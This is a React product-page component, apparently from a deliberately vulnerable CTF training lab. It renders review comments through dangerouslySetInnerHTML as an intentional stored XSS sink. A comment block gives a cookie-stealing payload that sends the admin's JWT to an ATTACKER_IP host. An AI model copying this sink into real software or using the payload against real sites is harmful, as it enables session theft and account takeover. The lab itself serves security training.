// =============================================================================
// ProShop CTF Lab — Product Screen (React)
// STAGE 2: Stored XSS rendered via dangerouslySetInnerHTML
// =============================================================================
import React, { useState } from 'react';
import { useParams, Link, useNavigate } from 'react-router-dom';
import { useSelector } from 'react-redux';

// Simplified product screen for the CTF lab
// In a real build this would use RTK Query — simplified here for portability

const ProductScreen = () => {
  const { id: productId } = useParams();
  const navigate = useNavigate();

  const [rating, setRating] = useState(0);
  const [comment, setComment] = useState('');
  const [product, setProduct] = useState(null);
  const [loading, setLoading] = useState(true);

  const { userInfo } = useSelector((state) => state.auth);

  React.useEffect(() => {
    fetch(`/api/products/${productId}`)
      .then((r) => r.json())
      .then((data) => {
        setProduct(data);
        setLoading(false);
      })
      .catch(() => setLoading(false));
  }, [productId]);

  const submitReviewHandler = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch(`/api/products/${productId}/reviews`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({ rating, comment }),
      });
      if (res.ok) {
        alert('Review submitted!');
        window.location.reload();
      }
    } catch (err) {
      alert('Error submitting review');
    }
  };

  if (loading) return <p>Loading...</p>;
  if (!product) return <p>Product not found</p>;

  return (
    <div style={{ padding: '20px', fontFamily: 'sans-serif' }}>
      <Link to="/">← Back</Link>
      <h1>{product.name}</h1>
      <img src={product.image} alt={product.name} style={{ width: 200 }} />
      <p><strong>Price:</strong> ${product.price}</p>
      <p>{product.description}</p>

      <hr />
      <h2>Customer Reviews</h2>

      {product.reviews && product.reviews.length === 0 && (
        <p>No reviews yet. Be the first!</p>
      )}

      {/* ───────────────────────────────────────────────────────────────────
        VULN-ID: XSS-001 - CWE-79 (Stored XSS Sink)

        The `review.comment` field is rendered using dangerouslySetInnerHTML.
        The backend stores raw unsanitized HTML (productController.js).
        When the admin bot visits this page, any <script> or event-handler
        payload in a review comment executes in the admin's browser context.

        Attack payload (POST /api/products/:id/reviews):
        {
          "rating": 5,
          "comment": "<img src=x onerror=\"fetch('http://ATTACKER_IP:9000/steal?c='+document.cookie)\">"
        }

        The document.cookie value will contain the admin's 'jwt' cookie
        (which is NOT httpOnly — see generateToken.js).
      ─────────────────────────────────────────────────────────────────────── */}
      {product.reviews &&
        product.reviews.map((review) => (
          <div
            key={review._id}
            style={{
              border: '1px solid #ccc',
              padding: 12,
              marginBottom: 10,
              borderRadius: 4,
            }}
          >
            <strong>{review.name}</strong> — Rating: {review.rating}/5
            <br />
            {/* dangerouslySetInnerHTML — XSS SINK */}
            <div dangerouslySetInnerHTML={{ __html: review.comment }} />
          </div>
        ))}

      <hr />
      <h3>Write a Review</h3>
      {userInfo ? (
        <form onSubmit={submitReviewHandler}>
          <div>
            <label>Rating:</label>
            <select value={rating} onChange={(e) => setRating(e.target.value)}>
              <option value="">Select...</option>
              {[1, 2, 3, 4, 5].map((n) => (
                <option key={n} value={n}>{n}</option>
              ))}
            </select>
          </div>
          <div>
            <label>Comment:</label>
            {/* Note: textarea accepts any HTML — what you type is what gets stored */}
            <textarea
              rows="4"
              cols="50"
              value={comment}
              onChange={(e) => setComment(e.target.value)}
              placeholder="Write your review here..."
            />
          </div>
          <button type="submit">Submit Review</button>
        </form>
      ) : (
        <p>Please <Link to="/login">sign in</Link> to write a review.</p>
      )}
    </div>
  );
};

export default ProductScreen;
